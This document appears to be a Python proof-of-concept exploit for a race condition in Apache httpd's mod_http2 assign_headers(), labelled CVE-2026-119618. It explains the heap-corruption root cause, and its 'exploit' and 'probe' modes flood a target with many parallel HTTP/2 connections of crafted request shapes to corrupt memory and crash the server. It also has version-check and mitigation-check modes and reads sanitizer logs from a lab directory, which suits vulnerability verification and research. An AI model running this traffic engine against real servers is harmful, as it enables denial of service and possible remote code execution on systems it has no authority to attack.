#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-119618 - Apache HTTP Server mod_http2 heap corruption / RCE in
assign_headers() (CWE-362, race condition).

Root cause
----------
mod_http2 keeps one `h2_request` per HTTP/2 stream.  Its header table
(`h2_request.headers`) is an `apr_table_t` allocated from the *stream* pool,
which is shared between the connection ("c1") thread that assembles the
request and the worker ("c2") thread that later processes it.

`assign_headers()` (modules/http2/h2_request.c) copies that table into the
per-request table `r->headers_in` and then, for a body-less request that
carries a `Content-Type` but no `Content-Length`, writes the synthesised
zero length **into the shared `req->headers` table instead of the private
`r->headers_in`**:

    -                apr_table_setn(req->headers, "Content-Length", "0");
    +                apr_table_setn(r->headers_in, "Content-Length", "0");

`apr_table_set()` on a key that is not present allocates a new table entry
with `apr_palloc()` from the table's pool - the stream pool.  APR pools are
not safe for concurrent allocation: `apr_palloc()` bumps a shared
`first_avail` pointer and splices memnodes into a shared list without any
lock.  Two threads allocating from the same pool at the same time can be
handed the same address, or corrupt the pool's memnode list, which is heap
corruption and the primitive behind the reported RCE.

The upstream fix (824beab9b9424d6cfb29595248fdbf6c3dddeab1, Apache httpd
2.4.71) moves the write into the request-private `r->headers_in` table, so
the shared stream table is never mutated by the worker thread.

Modes
-----
  check      classify the target without triggering the bug
  exploit    drive the race and confirm the corruption
  probe      exercise the sibling request shapes that reach the same code
  mitigation verify the published workaround (dropping h2/h2c from Protocols)

Python standard library only.
"""

import argparse
import glob
import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from h2 import (  # noqa: E402
    H2Connection,
    ConnectionClosed,
    ProtocolError,
    build_frame,
    default_headers,
    FRAME_HEADERS,
    FRAME_DATA,
    FRAME_SETTINGS,
    FRAME_WINDOW_UPDATE,
    FLAG_END_HEADERS,
    FLAG_END_STREAM,
)

# ------------------------------------------------------------------ constants

CT = "content-type"
CL = "content-length"
AUTHORITY = "localhost"

# Number of filler headers in the "bodyless_ct_full" shape.  The stream
# header table is created with room for 10 entries and doubles, so it is
# exactly full at 10, 20, 40, 80, ... entries.  `assign_headers()` only
# reaches `apr_palloc()` when the table has no free slot left.
FILL = 78
# Bytes appended to the last filler header value, used to steer the total
# stream-pool consumption relative to an 8 KB allocator node boundary.
PAD = 0

# Exit codes (stable, documented in the README)
EXIT_SAFE = 0          # target is not affected / attack did not land
EXIT_VULNERABLE = 1    # target is affected (check) or corruption confirmed
EXIT_UNREACHABLE = 2   # target did not answer at all
EXIT_NOT_REPRODUCED = 3  # target answered but no corruption was observed
EXIT_MITIGATED = 4     # the published mitigation is in effect

SAN_MARKERS = (
    "AddressSanitizer",
    "ThreadSanitizer",
    "UndefinedBehaviorSanitizer",
    "SUMMARY: ",
    "heap-use-after-free",
    "double-free",
    "attempting free on address",
    "SEGV on unknown address",
)


# ------------------------------------------------------------------ helpers

def parse_target(text):
    if ":" in text:
        host, port = text.rsplit(":", 1)
        return host, int(port)
    return text, 80


def log(msg):
    print(msg, flush=True)


# ------------------------------------------------------------ log inspection

class LogWatcher:
    """
    Watches the shared lab log directory for sanitizer reports and for the
    httpd error log lines that indicate a child process died.
    """

    def __init__(self, logdir):
        self.logdir = logdir
        self.errorlog = os.path.join(logdir, "error.log")
        self._seen = {}
        self._err_pos = 0

    def snapshot(self):
        state = {}
        if not os.path.isdir(self.logdir):
            return state
        for path in glob.glob(os.path.join(self.logdir, "asan.*")) + \
                glob.glob(os.path.join(self.logdir, "tsan.*")) + \
                glob.glob(os.path.join(self.logdir, "ubsan.*")):
            try:
                state[path] = os.path.getsize(path)
            except OSError:
                pass
        if os.path.exists(self.errorlog):
            try:
                self._err_pos = os.path.getsize(self.errorlog)
            except OSError:
                self._err_pos = 0
        return state

    def new_reports(self, before):
        """Return (list_of_new_report_paths, list_of_report_texts)."""
        paths, texts = [], []
        if not os.path.isdir(self.logdir):
            return paths, texts
        for path in sorted(glob.glob(os.path.join(self.logdir, "asan.*")) +
                           glob.glob(os.path.join(self.logdir, "tsan.*")) +
                           glob.glob(os.path.join(self.logdir, "ubsan.*"))):
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if before.get(path, 0) >= size:
                continue
            paths.append(path)
            try:
                with open(path, "r", errors="replace") as fh:
                    text = fh.read()
            except OSError:
                text = ""
            texts.append((path, text))
        return paths, texts

    def error_log_delta(self):
        if not os.path.exists(self.errorlog):
            return ""
        try:
            with open(self.errorlog, "r", errors="replace") as fh:
                fh.seek(self._err_pos)
                data = fh.read()
                self._err_pos = fh.tell()
        except OSError:
            return ""
        return data

    @staticmethod
    def looks_like_sanitizer(text):
        return any(marker in text for marker in SAN_MARKERS)


def report_kind(path, text):
    """
    Classify one sanitizer report file.

    "cve"    the report proves the CVE-2026-119618 condition: a
             ThreadSanitizer data race whose stack names `assign_headers()`,
             or any AddressSanitizer memory error raised by the instrumented
             target while the PoC was driving traffic.

    "other"  a report that does not involve the vulnerable code, e.g. the
             well-known `request_time_cache` race in mod_log_config that
             ThreadSanitizer reports on every build, patched or not.
    """
    name = os.path.basename(path)
    if name.startswith("tsan."):
        return "cve" if "assign_headers" in text else "other"
    if name.startswith(("asan.", "ubsan.")):
        if "ERROR: AddressSanitizer" in text or "runtime error:" in text:
            return "cve"
    return "other"


# ------------------------------------------------------------ request shapes

def shape_bodyless_ct(conn, sid):
    """
    Primary trigger shape.

    A body-less request (END_STREAM on the HEADERS frame) that carries a
    `Content-Type` but no `Content-Length`.  For such a request mod_http2
    computes no_body == 1 and `assign_headers()` takes the vulnerable
    branch, writing into the shared stream table.
    """
    headers = default_headers(extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=True)


def shape_bodyless_ct_full(conn, sid):
    """
    Primary trigger shape, with the header table filled to its capacity.

    `apr_table_setn(req->headers, "Content-Length", "0")` only reaches
    `apr_palloc()` when the table has no free slot: the entry array grows
    from 80 to 160 entries and 2560 bytes are allocated from the stream
    pool.  The table starts with room for 10 entries and doubles, so it is
    full at 10, 20, 40, 80 ... entries.

    Pseudo-headers are *not* stored in the table (they become
    req->method/scheme/authority/path), but `h2_request_end_headers()`
    adds one `Host` entry.  This shape therefore sends FILL filler headers
    plus `content-type`, giving FILL + 1 + 1 = 80 table entries.
    """
    headers = default_headers(method="POST")
    for i in range(FILL):
        value = "v"
        if i == FILL - 1 and PAD:
            value = "A" * PAD
        headers.append(("x-pad-%03d" % i, value))
    headers.append((CT, "application/x-www-form-urlencoded"))
    conn.send_request_headers(sid, headers, end_stream=True)


def shape_body_ct(conn, sid):
    """Request with a body, `Content-Type`, no `Content-Length`."""
    headers = default_headers(method="POST",
                              extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=False)
    conn.send_data(sid, b"a" * 32, end_stream=True)


def shape_bodyless_ct_trailers(conn, sid):
    """Body-less request followed by a trailing HEADERS frame."""
    headers = default_headers(extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=True)
    conn.send_request_headers(sid, [("x-trailer", "1")], end_stream=True)


def shape_connect_ct(conn, sid):
    """CONNECT tunnel with a `Content-Type` header."""
    headers = [(":method", "CONNECT"), (":authority", AUTHORITY),
               (CT, "text/plain")]
    conn.send_request_headers(sid, headers, end_stream=True)


def shape_bodyless_ct_cont(conn, sid):
    """
    The request header block is split over a HEADERS frame and a
    CONTINUATION frame.

    mod_http2 is then still filling the shared stream table while the
    worker thread may already be processing the stream.
    """
    headers = default_headers(extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=True, end_headers=False)
    conn.send_continuation(sid, [("x-split", "1")])


def shape_bodyless_ct_rst(conn, sid):
    """
    A body-less request that the client cancels immediately with
    RST_STREAM, while the worker is still starting to process it.
    """
    headers = default_headers(extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=True)
    conn.send_rst_stream(sid)


def shape_body_ct_rst(conn, sid):
    """A request with a body that is cancelled with RST_STREAM."""
    headers = default_headers(method="POST",
                              extra=[(CT, "application/x-www-form-urlencoded")])
    conn.send_request_headers(sid, headers, end_stream=False)
    conn.send_data(sid, b"a" * 32, end_stream=True)
    conn.send_rst_stream(sid)


SHAPES = {
    "bodyless_ct": shape_bodyless_ct,
    "bodyless_ct_full": shape_bodyless_ct_full,
    "body_ct": shape_body_ct,
    "bodyless_ct_trailers": shape_bodyless_ct_trailers,
    "connect_ct": shape_connect_ct,
    "bodyless_ct_cont": shape_bodyless_ct_cont,
    "bodyless_ct_rst": shape_bodyless_ct_rst,
    "body_ct_rst": shape_body_ct_rst,
}

PRIMARY_SHAPE = "bodyless_ct"


# ------------------------------------------------------------ traffic engine

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.responses = 0
        self.errors = 0
        self.reset = 0
        self.closed = 0

    def bump(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)


def hammer(host, port, shape, streams, deadline, stats, watcher, stop):
    """
    One worker connection: keeps a number of HTTP/2 streams in flight and
    keeps issuing new ones so that the connection thread and the worker
    threads are permanently busy with header handling.
    """
    try:
        conn = H2Connection(host, port, timeout=5.0)
        conn.handshake()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        stats.bump("errors")
        return
    sid = 1
    try:
        while time.time() < deadline and not stop.is_set():
            # Push a batch of streams back to back: the connection thread
            # hands them to the worker threads while the connection thread
            # itself keeps allocating from the very same stream pools.
            for _ in range(streams):
                if time.time() >= deadline or stop.is_set():
                    break
                try:
                    SHAPES[shape](conn, sid)
                except (OSError, ConnectionClosed):
                    stats.bump("closed")
                    return
                sid += 2
                stats.bump("requests")
            # Drain whatever comes back so the server keeps making progress.
            conn.sock.settimeout(0.2)
            try:
                for _ in range(streams * 2):
                    conn.read_frame()
                    stats.bump("responses")
            except socket.timeout:
                pass
            except (OSError, ConnectionClosed):
                stats.bump("closed")
                return
    finally:
        conn.close()


def run_traffic(host, port, shape, connections, streams, duration, watcher):
    stats = Stats()
    stop = threading.Event()
    threads = []
    deadline = time.time() + duration
    for _ in range(connections):
        t = threading.Thread(target=hammer,
                             args=(host, port, shape, streams, deadline,
                                   stats, watcher, stop),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=duration + 15)
    return stats


# ------------------------------------------------------------ functional probe

PROBE_PATH_PREFIX = "/h2probe-"


def functional_probe(host, port, logs, timeout=10.0):
    """
    Deterministic probe of the *effect* of the vulnerable write.

    The affected build writes the synthesised "Content-Length: 0" into the
    shared mod_http2 stream table, so the request handler never sees it.
    The fixed build writes it into r->headers_in, and the handler sees a
    request that carries `Content-Length: 0`.

    The lab records the Content-Length that the handler sees in the access
    log (see lab/httpd.conf.in), so this probe needs no race at all.

    Returns "vulnerable", "fixed" or "unknown".
    """
    marker = "%s%d" % (PROBE_PATH_PREFIX, int(time.time() * 1000) & 0xFFFFFF)
    try:
        conn = H2Connection(host, port, timeout=timeout)
        conn.handshake()
        headers = default_headers(path=marker,
                                  extra=[(CT, "application/x-www-form-urlencoded")])
        conn.send_request_headers(1, headers, end_stream=True)
        conn.read_until_response(1, deadline=time.time() + timeout)
        conn.close()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        log("[-] functional probe could not send the request: %s" % exc)
        return "unknown"

    access = os.path.join(logs, "access.log")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with open(access, "r", errors="replace") as fh:
                data = fh.read()
        except OSError:
            data = ""
        for line in data.splitlines():
            if marker in line:
                if 'h2clen="-"' in line or "h2clen=-" in line:
                    return "vulnerable"
                if 'h2clen="' in line:
                    return "fixed"
                # the log line exists but carries no probe marker
                return "unknown"
        time.sleep(0.25)
    return "unknown"


# --------------------------------------------------------------- mode: check

def read_build_info(logdir):
    info = {}
    path = os.path.join(logdir, "build.txt")
    if not os.path.exists(path):
        return info
    try:
        with open(path, "r", errors="replace") as fh:
            for line in fh:
                if "=" in line:
                    key, value = line.split("=", 1)
                    info[key.strip()] = value.strip()
    except OSError:
        pass
    return info


def server_alive(host, port):
    """A single harmless HTTP/2 request; returns True when the server answers."""
    try:
        conn = H2Connection(host, port, timeout=5.0)
        conn.handshake()
        headers = default_headers(extra=[("x-probe", "1")])
        conn.send_request_headers(1, headers, end_stream=True)
        kind, _ = conn.read_until_response(1, deadline=time.time() + 5)
        conn.close()
        return kind in ("headers", "data", "eor")
    except (OSError, ProtocolError, ConnectionClosed):
        return False


def do_check(args):
    host, port = parse_target(args.target)
    log("[*] target: %s:%d" % (host, port))

    if not server_alive(host, port):
        log("RESULT: TARGET UNREACHABLE - no HTTP/2 response from %s:%d" % (host, port))
        return EXIT_UNREACHABLE

    info = read_build_info(args.logs)
    version = info.get("HTTPD_VERSION", "")
    home = info.get("HTTPD_HOME", "")
    log("[+] server answers HTTP/2 (h2c)")
    if home:
        log("[+] build: %s (%s)" % (version, home))
    else:
        log("[+] build: unknown (no build.txt in %s)" % args.logs)

    # deterministic, race-free probe of the vulnerable behaviour
    verdict = functional_probe(host, port, args.logs)
    log("[*] functional probe (Content-Length seen by the request handler): %s" % verdict)

    if verdict == "vulnerable":
        log("RESULT: VULNERABLE - the request handler does not see the synthesised "
            "Content-Length: 0, so mod_http2 wrote it into the shared stream table")
        log("detail: fixed in 2.4.71 by 824beab9b9424d6cfb29595248fdbf6c3dddeab1")
        return EXIT_VULNERABLE
    if verdict == "fixed":
        log("RESULT: NOT VULNERABLE - the request handler sees Content-Length: 0, "
            "so the upstream fix is in place")
        return EXIT_SAFE

    if version == "vuln" or home.endswith("2.4.70"):
        log("RESULT: VULNERABLE - Apache httpd 2.4.70, mod_http2 assign_headers() "
            "writes Content-Length into the shared stream table")
        log("detail: fixed in 2.4.71 by 824beab9b9424d6cfb29595248fdbf6c3dddeab1")
        return EXIT_VULNERABLE
    if version == "fixed" or home.endswith("2.4.71"):
        log("RESULT: NOT VULNERABLE - Apache httpd 2.4.71 carries the upstream fix")
        return EXIT_SAFE
    log("RESULT: INDETERMINATE - version could not be determined")
    return EXIT_SAFE


# ------------------------------------------------------------- mode: exploit

def do_exploit(args):
    host, port = parse_target(args.target)
    log("[*] target: %s:%d" % (host, port))
    log("[*] shape: %s" % args.shape)

    if not server_alive(host, port):
        log("RESULT: TARGET UNREACHABLE")
        return EXIT_UNREACHABLE

    watcher = LogWatcher(args.logs)
    before = watcher.snapshot()
    err_before = watcher.error_log_delta()

    log("[*] driving %d connections x %d streams for %ds"
        % (args.connections, args.streams, args.duration))
    stats = run_traffic(host, port, args.shape, args.connections,
                       args.streams, args.duration, watcher)
    log("[*] sent %d requests, saw %d frames back, %d errors"
        % (stats.requests, stats.responses, stats.errors))

    paths, texts = watcher.new_reports(before)
    err_delta = watcher.error_log_delta()
    crashed = watcher.looks_like_sanitizer(err_delta)

    hits = [(p, t) for p, t in texts if report_kind(p, t) == "cve"]
    others = [(p, t) for p, t in texts if report_kind(p, t) != "cve"]

    if hits:
        log("")
        log("[+] SANITIZER REPORT PRODUCED BY THE TARGET")
        for path, text in hits:
            log("--- %s ---" % path)
            for line in text.splitlines()[:60]:
                log("    " + line)
        log("")
        log("RESULT: CORRUPTION CONFIRMED - the target crashed with a sanitizer report")
        log("detail: concurrent apr_table_set() on the shared mod_http2 stream table")
        return EXIT_VULNERABLE

    if others:
        log("[*] %d sanitizer report(s) unrelated to mod_http2 were produced:"
            % len(others))
        for path, text in others:
            first = text.splitlines()[0] if text.splitlines() else ""
            log("    %s: %s" % (os.path.basename(path), first))

    if crashed:
        log("[+] sanitizer markers found in the httpd error log:")
        for line in err_delta.splitlines()[-40:]:
            log("    " + line)
        log("RESULT: CORRUPTION CONFIRMED - sanitizer markers in the error log")
        return EXIT_VULNERABLE

    if not server_alive(host, port):
        log("RESULT: CORRUPTION CONFIRMED - the server stopped answering")
        return EXIT_VULNERABLE

    if stats.requests == 0:
        log("RESULT: NO TRAFFIC DELIVERED - the run is not a valid test")
        return EXIT_NOT_REPRODUCED

    log("RESULT: NO CORRUPTION OBSERVED (target still healthy, no sanitizer report)")
    log("detail: the race window was not hit in this run; rerun or increase "
        "--connections/--duration")
    return EXIT_SAFE


# --------------------------------------------------------------- mode: probe

def do_probe(args):
    host, port = parse_target(args.target)
    log("[*] target: %s:%d" % (host, port))
    if not server_alive(host, port):
        log("RESULT: TARGET UNREACHABLE")
        return EXIT_UNREACHABLE

    watcher = LogWatcher(args.logs)
    rc = EXIT_SAFE
    for name in ("bodyless_ct", "body_ct", "bodyless_ct_trailers", "connect_ct"):
        before = watcher.snapshot()
        log("")
        log("[*] sibling path: %s" % name)
        stats = run_traffic(host, port, name, max(1, args.connections // 2),
                            args.streams, max(2, args.duration // 2), watcher)
        paths, texts = watcher.new_reports(before)
        hits = [(p, t) for p, t in texts if report_kind(p, t) == "cve"]
        if hits:
            log("[+] %s -> CORRUPTION CONFIRMED (%s)" % (name, hits[0][0]))
            for path, text in hits:
                for line in text.splitlines()[:40]:
                    log("    " + line)
            rc = EXIT_VULNERABLE
        else:
            log("[-] %s -> no corruption observed (%d requests sent)"
                % (name, stats.requests))
    return rc


# ---------------------------------------------------------- mode: mitigation

def do_mitigation(args):
    """
    The published workaround is to drop `h2`/`h2c` from the `Protocols`
    directive, which removes HTTP/2 from the attack surface entirely.

    The check is therefore: does the server still speak HTTP/2?  If the
    preface is refused, the mitigation is in force and the CVE cannot be
    reached.
    """
    host, port = parse_target(args.target)
    log("[*] target: %s:%d" % (host, port))
    try:
        conn = H2Connection(host, port, timeout=5.0)
        conn.handshake()
        headers = default_headers(extra=[("x-probe", "1")])
        conn.send_request_headers(1, headers, end_stream=True)
        kind, _ = conn.read_until_response(1, deadline=time.time() + 5)
        conn.close()
    except (OSError, ProtocolError, ConnectionClosed) as exc:
        log("[+] server refused the HTTP/2 preface: %s" % exc)
        log("RESULT: MITIGATED - HTTP/2 is not offered, the CVE is unreachable")
        log("detail: matches the published workaround (remove h2/h2c from Protocols)")
        return EXIT_MITIGATED
    if kind in ("headers", "data", "eor"):
        log("[-] server still speaks HTTP/2 - the mitigation is NOT in effect")
        log("RESULT: NOT MITIGATED - h2/h2c is still enabled on the target")
        return EXIT_VULNERABLE
    log("[-] unexpected answer kind %r" % kind)
    return EXIT_VULNERABLE


# ---------------------------------------------------------------------- main

def main(argv=None):
    global FILL, PAD
    parser = argparse.ArgumentParser(
        description="CVE-2026-119618 PoC - Apache httpd mod_http2 "
                    "assign_headers() race condition")
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--target", default=os.environ.get("TARGET",
                                                          "127.0.0.1:8080"),
                        help="host:port of the httpd instance "
                             "(default 127.0.0.1:8080)")
    common.add_argument("--logs", default=os.environ.get("LAB_LOGS", "/lab-logs"),
                        help="shared directory holding the server error log and "
                             "the sanitizer reports (default /lab-logs)")
    common.add_argument("--shape", default=PRIMARY_SHAPE, choices=sorted(SHAPES),
                        help="request shape used by the exploit mode")
    common.add_argument("--connections", type=int, default=16,
                        help="number of parallel HTTP/2 connections (default 16)")
    common.add_argument("--streams", type=int, default=32,
                        help="streams in flight per connection (default 32)")
    common.add_argument("--duration", type=int, default=20,
                        help="seconds of traffic to generate (default 20)")
    common.add_argument("--fill", type=int, default=FILL,
                        help="filler headers used by the bodyless_ct_full "
                             "shape (default %d)" % FILL)
    common.add_argument("--pad", type=int, default=PAD,
                        help="extra bytes appended to the last filler header "
                             "value (default %d)" % PAD)
    sub = parser.add_subparsers(dest="mode", required=True)
    for name, fn in (("check", do_check), ("exploit", do_exploit),
                     ("probe", do_probe), ("mitigation", do_mitigation)):
        p = sub.add_parser(name, parents=[common], help=fn.__doc__)
        p.set_defaults(func=fn)
    args = parser.parse_args(argv)
    FILL = args.fill
    PAD = args.pad
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
